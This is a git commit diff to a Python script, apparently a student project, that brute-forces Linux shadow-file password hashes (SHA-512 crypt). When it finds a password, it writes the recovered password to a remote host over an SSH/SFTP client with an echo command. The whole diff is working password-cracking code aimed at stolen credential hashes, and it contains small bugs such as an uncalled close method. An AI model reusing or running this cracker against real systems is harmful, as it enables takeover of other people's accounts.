dbaadca56e965dab42f47e1a3d51a8ae3ce09766
kinbel <theophane.matis@icloud.com>
2021-07-25 00:20:06 +0200

    amélioration brute force, mise en place pour linux à partir du fichier shadow plus création d'un fichier de retour

--- BruteForce.py
+++ BruteForce.py
@@ -3,14 +3,17 @@ from passlib.hash import sha512_crypt as sha512
 
 liste = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9','!','&','%','$','@']
 
-def bruteForce(word, salt, length, hashWord):
+def bruteForce(word,length, salt, shadow, user, client):
     if length > 0:
         for letter in liste:
-            if sha512.using(salt=salt).hash(word, rounds=5000) == hashWord:
-                print('Le mot de passe est trouvé et est : '+word+letter)
+            if sha512.using(salt=salt).hash(word+letter, rounds=5000) == shadow:
+                sftp = client.open_sftp()
+                sftp.open('/Projet/Bruteforce/password','w')
+                sftp.close
+                client.exec_command(f'echo "Le mot de passe du user {user} est '+word+letter+'" >> /Projet/Bruteforce/password')
                 return 0
             else:
-                if bruteForce(word+letter,salt,length-1,hashWord) == 0:
+                if bruteForce(word+letter, length-1, salt, shadow, user, client) == 0:
                     return 0
     return 1
 
